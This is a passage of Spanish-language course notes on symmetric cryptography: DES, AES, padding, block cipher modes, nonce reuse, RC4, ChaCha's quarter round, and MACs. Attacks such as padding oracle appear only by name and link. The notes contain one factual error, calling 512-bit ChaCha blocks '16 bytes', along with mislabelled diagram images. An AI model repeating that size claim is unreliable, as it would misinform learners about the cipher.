sea completamente factible un ataque de fuerza bruta en unos días, contando con la capacidad computacional adecuada o pagando por un servicio especializado.\u003c/p\u003e\n\u003cp\u003ePueden encontrar una descripción bastante extensiva del algoritmo \u003ca href=\"https://en.wikipedia.org/wiki/Data_Encryption_Standard\"\u003een Wikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eExiste una versión \u0026ldquo;fortificada\u0026rdquo; denominada \u003cstrong\u003e3DES\u003c/strong\u003e en la cual se aplica 3 veces el algoritmo DES a cada bloque, utilizando hasta 3 llaves ($K_1, K_2, K_3$) de 56 bits distintas, de la siguiente forma:\u003c/p\u003e\n\u003cp\u003e$$C = E_{K_3}(D_{K_2}(E_{K_1}(P)))$$\n$$P = D_{K_1}(E_{K_2}(D_{K_3}(C)))$$\u003c/p\u003e\n\u003cp\u003eSin embargo, esta versión es considerada insegura por el NIST desde el año 2017 debido a la existencia de ataques de colisión, como SWEET32. Más información sobre esta versión pueden encontrarla en \u003ca href=\"https://en.wikipedia.org/wiki/Triple_DES\"\u003ela página de Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch4 id=\"aes\"\u003eAES\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../aes_rounds.jpg\" alt=\"Rondas AES\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEstandarizado\u003c/strong\u003e en el año 2000\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de llave:\u003c/strong\u003e 128, 192 o 256 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de bloque:\u003c/strong\u003e 128 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRondas:\u003c/strong\u003e 10, 12 o 14\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAdvanced Encryption Standard\u003c/strong\u003e es el cifrador de bloque por defecto hoy en día. Dependiendo del tamaño de la llave, consiste en entre 10 y 14 rondas de operaciones de substitución y permutación, tal como se muestra en la figura anterior (obtenida del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e)\u003c/p\u003e\n\u003cp\u003ePara mayor información sobre la utilidad de cada ronda, se les recomienda revisar el libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e o la \u003ca href=\"https://es.wikipedia.org/wiki/AES\"\u003epágina de Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"modos-de-cifrado\"\u003eModos de Cifrado\u003c/h3\u003e\n\u003cp\u003eDebido a que los cifradores de bloque pueden encargarse de cifrar datos de tamaño igual al tamaño del bloque, es necesario definir estrategias que permitan cifrar información de un largo mucho mayor. Acá entran en juego los \u0026ldquo;modos de cifrado\u0026rdquo;, los cuales definen el algoritmo a usar para realizar el cifrado de la información completa.\u003c/p\u003e\n\u003cp\u003eEn todos los modos que se verán a continuación, se divide el texto completo en bloques de tamaño $BlockSize$. En caso que el texto completo no tenga un tamaño múltiplo de $BlockSize$, se agregan bytes al final de forma de rellenar (\u003cem\u003epadding\u003c/em\u003e) y obtener un texto plano de un tamaño adecuado. Lo anterior genera un problema cuando el texto ya tiene un tamaño múltiplo de $BlockSize$, por lo que en esos casos es necesario agregar un bloque completo, solo con padding.\u003c/p\u003e\n\u003cp\u003eAlgunos tipos de \u003cem\u003epadding\u003c/em\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eANSI X9.23\u003c/strong\u003e: Se rellena con bytes \u003ccode\u003e\\x00\u003c/code\u003e o algún byte al azar, salvo el último byte del bloque rellenado, que incluye como valor la cantidad de bytes usados para rellenar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePKCS7\u003c/strong\u003e: Se rellena con n bytes con el valor $hex(n)$, con $n \\in [1,BlockSize]$.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"ecb\"\u003eECB\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../ecb_enc.png\" alt=\"Cifrado ECB\"\u003e\n\u003cimg src=\"../ecb_enc.png\" alt=\"Descifrado ECB\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eElectronic Codebook\u003c/strong\u003e es el modo de cifrado más simple. Cada bloque se cifra por separado usando siempre la misma llave, concatenándose todo para generar el texto cifrado.\u003c/p\u003e\n\u003ch5 id=\"filtración-de-información-estructural\"\u003eFiltración de información estructural\u003c/h5\u003e\n\u003cp\u003eSi bien este modo es muy fácil de implementar, el mayor problema que posee es que es fácil encontrar patrones en los mensajes si los datos cifrados tienen una estructura que se repite bastante. Un muy buen ejemplo de lo anterior es esta imagen del \u003ca href=\"https://isc.tamu.edu/~lewing/linux/\"\u003ePingüino Tux\u003c/a\u003e, la cual si cifrásemos bloques de ella usando AES/ECB, podríamos ver ciertos patrones con bloques de colores parecidos que delinearían los bordes del pingüino.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../tux.jpg\" alt=\"Tux\"\u003e\n\u003cimg src=\"../tux_ecb.jpg\" alt=\"Tux ECB\"\u003e\u003c/p\u003e\n\u003ch4 id=\"cbc\"\u003eCBC\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../cbc_enc.png\" alt=\"Cifrado CBC\"\u003e\n\u003cimg src=\"../cbc_enc.png\" alt=\"Descifrado CBC\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCipher Block Chaining\u003c/strong\u003e es un modo en el que el cifrado de cada bloque depende del resultado del cifrado del bloque anterior. Como caso especial, el primer bloque utiliza un valor público llamado \u003cem\u003eVector de Inicialización\u003c/em\u003e \u003ccode\u003e(IV)\u003c/code\u003e. Es importante que este valor sea aleatorio en cada sesión de cifrado, con el objetivo de impedir algunos tipos de ataques.\u003c/p\u003e\n\u003cp\u003eEl cambio anterior con respecto a ECB ayuda a que si ciframos exactamente la misma información en dos bloques distintos, el resultado cifrado no sea el mismo, evitando problemas como los vistos con la imagen del pingüino.\u003c/p\u003e\n\u003ch5 id=\"padding-oracle-attack\"\u003ePadding Oracle Attack\u003c/h5\u003e\n\u003cp\u003eSi contamos con feedback acerca del estado de un mensaje cifrado (específicamente, si el mensaje está bien formado o no), es posible ejecutar un ataque denominado \u003ca href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\"\u003ePadding Oracle Attack\u003c/a\u003e. En el curso \u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/anexos/padding-oracle/\"\u003eCC5312 Seguridad Computacional\u003c/a\u003e se explica cómo ejecutar este ataque.\u003c/p\u003e\n\u003ch5 id=\"maleabilidad-del-mensaje-cifrado-si-el-iv-no-cambia\"\u003eMaleabilidad del mensaje cifrado si el IV no cambia\u003c/h5\u003e\n\u003cp\u003eSi tanto el IV como la llave se mantienen en un servicio que permite elegir los mensajes a cifrar, es posible armar mensajes cifrados a medida sin necesidad de conocer la llave ni el IV. Veremos cómo hacer esto en las clases.\u003c/p\u003e\n\u003ch4 id=\"ctr\"\u003eCTR\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../ctr_enc.png\" alt=\"Cifrado CTR\"\u003e\n\u003cimg src=\"../ctr_enc.png\" alt=\"Descifrado CTR\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCounter Mode\u003c/strong\u003e es un modo que permite paralelizar el cifrado y descifrado de un mensaje, dado que la parte que pasa por el cifrador de bloque es un valor predeterminado y predecible. Además, el descifrado se ejecuta con el algoritmo de cifrado del cifrador de bloque elegido.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-flujo\"\u003eCifradores de Flujo\u003c/h2\u003e\n\u003cp\u003eLos cifradores de flujo intentan emular el uso de un cifrador de tipo \u003cstrong\u003eOne-Time Pad\u003c/strong\u003e, pero usando un generador de números \u003cstrong\u003epseudoaleatorio\u003c/strong\u003e. Estos generadores usan una semilla realmente aleatoria al inicializarse, la cual les permite generar una salida continua extensa que se comporta de forma similar a un flujo de datos realmente aleatoria. Posteriormente, es posible cifrar un stream de datos simplemente haciendo $XOR$ entre los datos y el flujo pseudoaleatorio. Con tal de que ambas partes conozcan la semilla, es posible asegurar la sincronización entre sus flujos aleatorios, con lo que se es posible comunicarse sin problemas y sin filtrar los mensajes.\u003c/p\u003e\n\u003ch3 id=\"el-_nonce_-en-los-cifradores-de-flujo\"\u003eEl \u003cem\u003enonce\u003c/em\u003e en los cifradores de flujo\u003c/h3\u003e\n\u003cp\u003ePartamos mencionando una potencial vulnerabilidad de los cifradores de flujo. Si se usa dos veces el mismo flujo pseudoaleatorio para dos conjuntos de datos (a partir del uso de la misma semilla), y luego se ejecuta la operación $XOR$ entre ambos textos cifrados, se obtendrá como resultado lo siguiente:\u003c/p\u003e\n\u003cp\u003e$$E(P_1) = P_1 \\oplus S$$\n$$E(P_2) = P_2 \\oplus S$$\n$$E(P_1) \\oplus E(P_2) = (P_1 \\oplus S) \\oplus (P_2 \\oplus S)$$\n$$E(P_1) \\oplus E(P_2) = (P_1 \\oplus P_2)$$\u003c/p\u003e\n\u003cp\u003eAsumiendo que el texto plano tiene cierta estructura, luego no es difícil deducir qué valores corresponden a $P_1$ y $P_2$ a partir de $E(P_1) \\oplus E(P_2)$.\u003c/p\u003e\n\u003cp\u003ePara evitar el problema anterior, los cifradores de flujo suelen recibir un parámetro extra, denominado \u003cem\u003enonce\u003c/em\u003e. Este campo puede ser considerado como público sin que esto signifique disminuir la seguridad del cifrador, pero \u003cstrong\u003edebe ser distinto\u003c/strong\u003e en cada ejecución del algoritmo, por lo que en algunas implementaciones corresponde simplemente a un contador que se incrementa en cada uso del cifrador. En caso que el nonce no siga una generación predecible, es necesario compartirlo entre ambas partes que desean comunicarse.\u003c/p\u003e\n\u003ch3 id=\"rc4\"\u003eRC4\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../rc4.png\" alt=\"Generación Aleatoriedad RC4\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño de llave\u003c/strong\u003e: Entre 40 y 2048 bits.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño del Nonce\u003c/strong\u003e: No lleva de forma oficial, aunque se suele agregar como parte de la llave.\u003c/p\u003e\n\u003cp\u003eTambién conocido como \u003cstrong\u003eARCFOUR\u003c/strong\u003e, es un cifrador de flujo diseñado el año 1987 pero filtrado el año 1994. Se comenzó a utilizar como un producto propietario de RSA Security, hasta que en el año 1994 se filtró su especificación en un foro cypherpunk.\u003c/p\u003e\n\u003cp\u003eAl hacerse público su funcionamiento, se empezaron a encontrar varios errores y vulnerabilidades en el algoritmo. Un ejemplo de estos problemas es que los primeros bytes de salida del generador pseudoaleatorio permiten adivinar el estado interno del mismo, derivándose así información sobre la clave.\u003c/p\u003e\n\u003cp\u003eSi bien su diseño no considera el uso de un nonce, éste se suele agregar de alguna de las formas siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eHasheando la semilla y el nonce y usando el valor hasheado como semilla. Esta es la forma recomendada.\u003c/li\u003e\n\u003cli\u003eConcatenando la semilla con el nonce. Sin embargo, esto puede traer problemas de aleatoriedad debido a fallas propias de RC4.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEs posible encontrar más información sobre este cifrador (y sus problemas) \u003ca href=\"https://en.wikipedia.org/wiki/RC4\"\u003een wikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"chacha\"\u003eChaCha\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../chacha.png\" alt=\"Ronda Chacha\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño de llave\u003c/strong\u003e 256 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño del Nonce\u003c/strong\u003e 64 bits\u003c/p\u003e\n\u003cp\u003eChaCha es una familia de cifradores de flujo basada en una variante de Salsa20. Estos cifradores definen un estado inicial compuesto por \u0026ldquo;palabras\u0026rdquo; de 32 bit dispuestas en una matriz de 4x4:\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e(00) \u003ccode\u003eexpa\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(01) \u003ccode\u003end 3\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(02) \u003ccode\u003e2-by\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(03) \u003ccode\u003ete k\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(04) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(05) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(06) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(07) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(08) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(09) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(10) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(11) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(12) \u003ccode\u003e P\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(13) \u003ccode\u003e P\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(14) \u003ccode\u003e N\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(15) \u003ccode\u003e N\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eDonde:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e(XX) representa el número del byte (se usa más abajo)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexpand 32-byte k\u003c/code\u003e es un texto en ASCII de 16 caracteres (4 \u003ccode\u003ewords\u003c/code\u003e de 32 bits)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eK\u003c/code\u003e es la llave dividida en 8 bloques de 32 bits cada uno\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eP\u003c/code\u003e (posición) es un contador que lleva cuenta de la cantidad de bloques cifrados.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eN\u003c/code\u003e corresponde a un \u003cem\u003enonce\u003c/em\u003e, es decir, un valor que no debe repetirse entre usos del sistema.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSi bien el cifrado es de tipo \u0026ldquo;flujo\u0026rdquo;, los bytes de éste se generan de a bloques de tamaño 512 bits (16 bytes). Para generar el bloque de número $i$, se ejecutan los siguientes pasos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSe setean los bytes $P$ del estado \u003ccode\u003earr\u003c/code\u003e en el valor binario de $i$\u003c/li\u003e\n\u003cli\u003eSe ejecuta 10 veces la siguiente operación en pseudocódigo (denominada \u0026ldquo;doble ronda\u0026rdquo;) sobre el estado:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"n\"\u003efunc\u003c/span\u003e \u003cspan class=\"n\"\u003edouble_round\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAcá \u003ccode\u003eQR\u003c/code\u003e o \u003cem\u003e\u0026ldquo;Quarter Round\u0026rdquo;\u003c/em\u003e se define de la siguiente forma:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eY \u003ccode\u003ex \u0026lt;\u0026lt;\u0026lt;= y\u003c/code\u003e corresponde a una \u0026ldquo;rotación de y bits al valor x\u0026rdquo;.\u003c/p\u003e\n\u003cp\u003eFinalmente, los valores correspondientes al estado luego de correr 10 veces la \u003cem\u003edouble round\u003c/em\u003e son XOReados con los datos, devolviendo el valor cifrado.\u003c/p\u003e\n\u003cp\u003eEl descifrado se ejecuta de la misma forma, dado que XOR es una operación que se cancela a sí misma al ejecutarse dos veces sobre el mismo texto.\u003c/p\u003e\n\u003ch2 id=\"más-allá-del-cifrado\"\u003eMás allá del cifrado\u003c/h2\u003e\n\u003cp\u003eMuchas veces, el cifrado no es suficiente para asegurar que una comunicación entre dos partes ocurre de forma segura. Un ejemplo: Si un mensaje cifrado no contiene metainformación acerca de cuándo fue mandado, un atacante podría reenviar mensajes de una persona a la otra, haciéndola pensar que se dijo nuevamente algo que en verdad no se dijo. Este ataque se denomina \u003ccode\u003eAtaque de Repetición\u003c/code\u003e (o Replay Attack), y se puede evitar agregando información secuencial al mensaje (por ejemplo, un contador monótono para cada participante).\u003c/p\u003e\n\u003cp\u003eOtro problema que puede ocurrir frente a una comunicación cifrada es que el mensaje sea alterado por un atacante antes de llegar al receptor. En el caso del cifrado de flujo, donde la modificación de un byte del texto cifrado altera solamente un byte del texto plano, una modificación de este estilo podría cambiar el significado del mensaje cifrado en una letra o símbolo. Para evitar este problema, es posible \u0026ldquo;autentificar\u0026rdquo; el mensaje a través de \u0026ldquo;message authentication codes\u0026rdquo; (MACs), los cuales permiten demostrar que el mensaje descifrado no ha sido intervenido de ninguna forma.\u003c/p\u003e\n\u003ch3 id=\"mac\"\u003eMAC\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eMessage Authentication Code\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eMAC es el nombre formal de este código extra que se agrega al mensaje cifrado para comprobar su autenticidad. Existen muchas formas de generar un MAC, a continuación nombramos algunas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eHMAC\u003c/strong\u003e se genera a partir de una función de Hash.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGCM\u003c/strong\u003e se genera a partir del uso de un cifrador de bloque (Gallois-Counter mode).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePoly1305\u003c/strong\u003e utiliza polinomios y una función extra (AES, un generador como ChaCha20) para generar aleatoriedad a partir de una semilla.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 